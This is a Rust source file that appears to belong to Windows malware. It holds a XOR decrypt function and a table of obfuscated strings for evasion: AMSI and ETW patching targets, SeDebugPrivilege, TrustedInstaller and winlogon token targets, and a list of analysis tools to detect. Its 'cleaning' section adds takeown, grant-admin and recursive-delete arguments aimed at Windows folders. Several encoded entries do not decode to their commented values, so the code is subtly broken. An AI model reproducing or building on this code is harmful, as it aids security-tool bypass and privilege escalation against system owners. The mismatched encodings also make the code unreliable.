#![allow(dead_code)]

/// Decrypts a byte array using XOR key 0x55
pub fn decrypt(data: &[u8]) -> String {
    let key = 0x55;
    data.iter().map(|b| b ^ key).collect::<Vec<u8>>().iter().map(|&c| c as char).collect()
}

// Encrypted Strings (Pre-XORed with 0x55)

// --- EVASION ---

// DLLs
pub const NTDLL: &[u8] = &[0x3B, 0x21, 0x31, 0x39, 0x39, 0x7B, 0x31, 0x39, 0x39, 0x55]; // "ntdll.dll"
pub const KERNEL32: &[u8] = &[0x3E, 0x30, 0x27, 0x3B, 0x30, 0x39, 0x66, 0x67, 0x7B, 0x31, 0x39, 0x39, 0x55]; // "kernel32.dll"
pub const AMSI_DLL: &[u8] = &[0x34, 0x38, 0x26, 0x3C, 0x7B, 0x31, 0x39, 0x39, 0x55]; // "amsi.dll"

// Targets
pub const TRUSTED_INSTALLER: &[u8] = &[0x01, 0x27, 0x20, 0x26, 0x21, 0x30, 0x31, 0x1C, 0x3B, 0x26, 0x21, 0x34, 0x39, 0x39, 0x30, 0x27, 0x7B, 0x30, 0x2D, 0x30, 0x55]; // "TrustedInstaller.exe"
pub const WINLOGON: &[u8] = &[0x22, 0x3C, 0x3B, 0x39, 0x3A, 0x32, 0x3A, 0x3B, 0x7B, 0x30, 0x2D, 0x30, 0x55]; // "winlogon.exe"

// APIs
pub const SE_DEBUG: &[u8] = &[0x06, 0x30, 0x11, 0x30, 0x37, 0x20, 0x32, 0x05, 0x27, 0x3C, 0x23, 0x3C, 0x39, 0x30, 0x32, 0x30, 0x55]; // "SeDebugPrivilege"
pub const AMSI_SCAN: &[u8] = &[0x14, 0x38, 0x26, 0x3C, 0x06, 0x36, 0x34, 0x3B, 0x17, 0x20, 0x33, 0x33, 0x30, 0x27, 0x55]; // "AmsiScanBuffer"
pub const ETW_WRITE: &[u8] = &[0x10, 0x21, 0x22, 0x10, 0x23, 0x30, 0x3B, 0x21, 0x02, 0x27, 0x3C, 0x21, 0x30, 0x55]; // "EtwEventWrite"

// Hunters (Prescience)
pub const WIRESHARK: &[u8] = &[0x22, 0x3C, 0x27, 0x30, 0x26, 0x3D, 0x34, 0x27, 0x3E, 0x55]; // "wireshark"
pub const PROCMON: &[u8] = &[0x25, 0x27, 0x3A, 0x36, 0x38, 0x3A, 0x3B, 0x55]; // "procmon"
pub const X64DBG: &[u8] = &[0x2D, 0x63, 0x61, 0x31, 0x37, 0x32, 0x55]; // "x64dbg"
pub const FIDDLER: &[u8] = &[0x33, 0x3C, 0x31, 0x31, 0x39, 0x30, 0x27, 0x55]; // "fiddler"
pub const TASKMGR: &[u8] = &[0x21, 0x34, 0x26, 0x3E, 0x38, 0x32, 0x27, 0x55]; // "taskmgr"
pub const PROCESSHACKER: &[u8] = &[0x25, 0x27, 0x3A, 0x36, 0x30, 0x26, 0x26, 0x3D, 0x34, 0x36, 0x3E, 0x30, 0x27, 0x55]; // "processhacker"
pub const TCPVIEW: &[u8] = &[0x21, 0x36, 0x25, 0x23, 0x3C, 0x30, 0x22, 0x55]; // "tcpview"
pub const IDA: &[u8] = &[0x3C, 0x31, 0x34, 0x63, 0x61, 0x55]; // "ida64"
pub const GHIDRA: &[u8] = &[0x32, 0x3D, 0x3C, 0x31, 0x27, 0x34, 0x55]; // "ghidra"

// --- CLEANING ---
pub const KEY: u8 = 0x55;
pub const WUPDATE_DIR: &[u8] = &[22, 111, 9, 2, 6, 21, 30, 2, 111, 6, 30, 23, 1, 22, 34, 27, 30, 17, 36, 1, 1, 27, 36, 20, 1, 36, 30, 21, 111, 17, 30, 22, 21, 39, 30, 34, 33, 85]; // "C:\Windows\SoftwareDistribution\Download"
pub const NET: &[u8] = &[59, 48, 33, 85]; // "net"
pub const STOP: &[u8] = &[38, 33, 58, 37, 85]; // "stop"
pub const START: &[u8] = &[38, 33, 52, 39, 33, 85]; // "start"
pub const WUAUSERV: &[u8] = &[34, 20, 52, 20, 38, 48, 39, 35, 85]; // "wuauserv"
pub const WIN_OLD: &[u8] = &[22, 111, 9, 2, 6, 21, 30, 2, 111, 34, 30, 39, 17, 30, 22, 1, 123, 30, 37, 17, 85]; // "C:\Windows.old"
pub const APPDATA: &[u8] = &[20, 5, 5, 17, 20, 1, 20, 85]; // "APPDATA"
pub const LOCALAPPDATA: &[u8] = &[25, 26, 22, 20, 25, 20, 5, 5, 17, 20, 1, 20, 85]; // "LOCALAPPDATA"
pub const VS_CACHE: &[u8] = &[3, 60, 38, 32, 52, 57, 117, 6, 33, 32, 49, 60, 58, 85]; // "Visual Studio"
pub const VS_WORKSPACE: &[u8] = &[123, 35, 38, 85]; // ".vs"
pub const VS_CODE_CACHE: &[u8] = &[22, 30, 17, 48, 117, 22, 52, 22, 40, 48, 85]; // "Code Cache"
pub const GRANT_ADMIN: &[u8] = &[122, 34, 39, 52, 59, 33, 117, 52, 33, 56, 60, 59, 60, 38, 33, 39, 52, 33, 30, 39, 38, 111, 27, 117, 122, 33, 85]; // "/grant administrators:F /t"
pub const TAKEOWN_ARGS: &[u8] = &[122, 35, 117, 122, 39, 117, 122, 33, 117, 58, 85]; // "/f /r /d o"
pub const RD_ARGS: &[u8] = &[122, 38, 117, 122, 36, 85]; // "/s /q"
